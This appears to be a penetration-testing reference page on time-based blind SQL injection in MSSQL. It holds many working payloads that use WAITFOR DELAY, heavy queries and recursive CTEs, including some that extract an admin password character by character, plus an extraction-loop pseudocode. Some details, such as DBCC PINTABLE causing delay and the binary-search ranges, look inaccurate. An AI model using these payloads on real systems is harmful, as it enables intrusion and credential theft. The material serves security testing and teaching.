---
title: Timing
description: Time-based techniques for MSSQL injection attacks
category: Injection Techniques
order: 11
tags: ["time-based", "blind injection", "waitfor"]
lastUpdated: 2025-03-15
---

## Timing

Time-based SQL injection is a blind technique that allows attackers to extract information from a database by analyzing the time it takes for queries to execute. This approach is useful when the application doesn't return error messages or query results directly, but the attacker can observe response timing differences.

### MSSQL Time Delay Functions

Microsoft SQL Server provides several ways to introduce time delays:

| Function             | Description                                   | Example                                                   |
| -------------------- | --------------------------------------------- | --------------------------------------------------------- |
| `WAITFOR DELAY`      | Pauses execution for a specified time         | `WAITFOR DELAY '0:0:5'` (5 seconds)                       |
| `WAITFOR TIME`       | Waits until a specific time of day            | `WAITFOR TIME '23:59:59'`                                 |
| `DBCC PINTABLE`      | Pins a table in memory (side effect is delay) | `DBCC PINTABLE ('database', 'table')`                     |
| Computational Delays | Heavy calculations that consume time          | `SELECT COUNT(*) FROM large_table CROSS JOIN large_table` |

### Basic Time-Based Injection

The most straightforward approach is to use `WAITFOR DELAY`:

```sql
' IF 1=1 WAITFOR DELAY '0:0:5'--
' IF 1=0 WAITFOR DELAY '0:0:5'--
```

If the response takes approximately 5 seconds for the first query but returns immediately for the second, the injection is successful.

### Conditional Time-Based Extraction

By combining conditional logic with time delays, you can extract information bit by bit:

```sql
-- Check if 'admin' user exists
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 WAITFOR DELAY '0:0:5'--

-- Extract password character by character
' IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65 WAITFOR DELAY '0:0:5'--
```

### Nested Conditions with Timing

For more complex extractions, nested conditions can be used:

```sql
-- Extract password with binary search approach
' IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) < 128 WAITFOR DELAY '0:0:5'--
```

### Binary Data Extraction

Binary search technique significantly reduces the number of requests needed:

```sql
-- Binary search to find character (Example process)
1. ' IF ASCII(...) < 128 WAITFOR DELAY '0:0:5'-- (If delayed, character < 128, else > 128)
2. ' IF ASCII(...) < 64 WAITFOR DELAY '0:0:5'-- (If delayed, character < 64, else between 64-128)
3. ' IF ASCII(...) < 96 WAITFOR DELAY '0:0:5'-- (If delayed, character < 96, else between 96-128)
...and so on
```

### Alternative Time Delay Methods

When `WAITFOR` is blocked, alternative delay methods can be used:

#### Heavy Queries

```sql
-- Creating a CPU-intensive query
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 SELECT COUNT(*) FROM sys.objects a, sys.objects b, sys.objects c--
```

#### Recursive CTEs

```sql
-- Using recursive CTE for delay
' IF (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 WITH q AS (SELECT 1 UNION ALL SELECT 1 FROM q) SELECT * FROM q OPTION (MAXRECURSION 32767)--
```

### Practical Attack Examples

#### Data Exfiltration Script Concept

A time-based attack to extract data usually involves:

1. Testing each position in the target data
2. For each position, testing possible characters (or using binary search)
3. Measuring response time to determine correct characters

```sql
-- Pseudocode for extracting admin password
FOR position = 1 to password_length
  FOR character_code = 32 to 127  -- Printable ASCII range
    ' IF ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), position, 1)) = character_code WAITFOR DELAY '0:0:5'--
    IF response_time > 5 seconds
      password[position] = CHR(character_code)
      BREAK
  NEXT
NEXT
```

#### Database Version Detection

```sql
-- Check if SQL Server version is 2016 (v13)
' IF (SELECT SUBSTRING(@@VERSION, 1, 2)) = '13' WAITFOR DELAY '0:0:5'--
```

#### Table/Column Existence

```sql
-- Check if a specific table exists
' IF EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'credit_cards') WAITFOR DELAY '0:0:5'--

-- Check if a column exists in a table
' IF EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name = 'users' AND column_name = 'password') WAITFOR DELAY '0:0:5'--
```

### Optimizing Time-Based Injection

#### Effective Delays

```sql
-- Finding the right delay time
-- Too short: might be missed due to network latency
-- Too long: attack takes longer
-- Recommended: 1-5 seconds depending on connection stability
' IF 1=1 WAITFOR DELAY '0:0:2'--
```

#### Batch Processing

```sql
-- Extracting multiple bits in one query
' IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 1) = 1 WAITFOR DELAY '0:0:1';
IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 2) = 2 WAITFOR DELAY '0:0:2';
IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) & 4) = 4 WAITFOR DELAY '0:0:4'--
```

### Limitations and Considerations

1. Time-based techniques are generally slower than other methods
2. Network latency and server load can cause false positives/negatives
3. Some environments have query execution timeouts
4. Modern security tools often detect and block time-based attacks
5. Multiple simultaneous connections may affect timing accuracy
